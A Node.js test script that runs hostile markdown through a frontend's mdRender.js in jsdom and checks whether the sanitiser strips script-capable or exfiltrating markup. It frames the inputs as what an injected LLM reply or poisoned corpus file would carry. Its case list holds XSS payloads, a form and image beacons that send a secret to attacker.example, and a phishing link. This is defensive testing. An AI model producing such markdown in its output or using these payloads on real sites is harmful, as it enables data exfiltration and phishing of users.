// Render-side attacks: feed hostile markdown (as an injected LLM reply, a
// poisoned news bullet, or a stored corpus file would carry it) through the
// real code/frontend/src/mdRender.js and inspect the HTML the Vue views
// v-html into the page.
//
//   JSDOM_DIR=<dir containing node_modules/jsdom> node tooling/sandbox/attack_render.mjs
//
// jsdom is not a project dependency — install it anywhere and point JSDOM_DIR at it.

import { createRequire } from 'node:module'
import path from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'

const here = path.dirname(fileURLToPath(import.meta.url))
const jsdomDir = process.env.JSDOM_DIR || path.join(here, '..', '..', 'code', 'frontend')
const { JSDOM } = createRequire(path.join(jsdomDir, 'package.json'))('jsdom')

// DOMPurify binds to `window` when first imported — set it up before importing mdRender.
const dom = new JSDOM('<!doctype html><html><body></body></html>', { url: 'https://klm.smtw.in/' })
globalThis.window = dom.window
globalThis.document = dom.window.document

const mdRender = pathToFileURL(path.join(here, '..', '..', 'code', 'frontend', 'src', 'mdRender.js')).href
const { renderMd } = await import(mdRender)

const cases = [
  ['script tag', '<script>alert(1)</script>'],
  ['img onerror', '<img src=x onerror=alert(1)>'],
  ['javascript: link', '[click](javascript:alert(1))'],
  ['svg animate', '<svg><animate onbegin=alert(1) attributeName=x dur=1s>'],
  ['iframe srcdoc', '<iframe srcdoc="<script>alert(1)</script>"></iframe>'],
  ['form action', '<form action="https://attacker.example"><button>Continue</button></form>'],
  ['external image beacon (exfil)', '![status](https://attacker.example/c?d=CORPUS-SECRET)'],
  ['external image via HTML', '<img src="https://attacker.example/c?d=CORPUS-SECRET">'],
  ['phishing link', '[Session expired — sign in again](https://klm-smtw.attacker.example/login)'],
]

let vulns = 0
for (const [name, md] of cases) {
  const out = renderMd(md)
  const probe = new JSDOM(`<body>${out}</body>`).window.document
  const exec = probe.querySelector('script, iframe, form, object, embed') ||
    [...probe.querySelectorAll('*')].some(el =>
      [...el.attributes].some(a => a.name.startsWith('on') ||
        /^\s*javascript:/i.test(a.value)))
  const beacon = [...probe.querySelectorAll('img[src]')]
    .some(i => new URL(i.getAttribute('src'), 'https://klm.smtw.in/').origin !== 'https://klm.smtw.in')
  const extLink = [...probe.querySelectorAll('a[href]')]
    .some(a => new URL(a.getAttribute('href'), 'https://klm.smtw.in/').origin !== 'https://klm.smtw.in')

  let status = 'BLOCKED', note = ''
  if (exec) { status = 'VULN'; note = 'script-capable markup survived' }
  else if (beacon) { status = 'VULN'; note = 'renders a cross-origin <img> — fires a request on view (only CSP stands between this and exfil)' }
  else if (extLink) { status = 'INFO'; note = 'external link rendered (needs a click)' }
  if (status === 'VULN') vulns++
  const colour = { BLOCKED: '\x1b[32m', VULN: '\x1b[31m', INFO: '\x1b[33m' }[status]
  console.log(`${colour}${status.padEnd(8)}\x1b[0m ${name}${note ? '  — ' + note : ''}`)
}
console.log(`\n${cases.length} checks, ${vulns} VULN`)
process.exit(vulns)
